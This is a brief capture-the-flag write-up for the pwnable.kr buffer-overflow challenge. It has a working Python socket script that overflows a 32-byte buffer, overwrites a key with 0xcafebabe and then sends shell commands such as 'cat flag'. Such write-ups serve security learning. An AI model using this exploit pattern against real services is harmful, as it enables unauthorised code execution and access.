//Buffer Overflow
//I created a socket connection and then passed it 'A'*32 to fill overflowme
//Then I passed 0xcafebabe (backwards) * 8 because 4 wasn't big enough to rewrite key...
//Then I could type 'cat flag' and receive the flag!

python bof.py
cat flag

I wrote a python script for this one.
After I completed it, I tried to make it able to send multiple commands... It stalls after the second send.

###
import socket

s = socket.socket()
s.connect(('pwnable.kr', 9000))

s.send('A'*32+'\xbe\xba\xfe\xca'*8+'\n')
data = 'a'
while(data != ''):
    inn = raw_input('Command: ')
    s.send(inn+'\n')
    data = s.recv(8192)

    print(data)
